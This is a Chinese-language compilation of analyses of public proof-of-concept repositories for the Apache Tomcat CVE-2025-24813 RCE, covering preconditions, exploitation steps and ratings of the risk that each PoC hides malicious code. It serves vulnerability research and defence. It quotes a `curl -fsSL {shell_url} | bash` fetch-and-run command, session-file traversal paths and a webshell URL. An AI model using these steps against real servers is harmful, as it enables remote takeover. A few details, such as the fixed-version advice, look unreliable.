**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

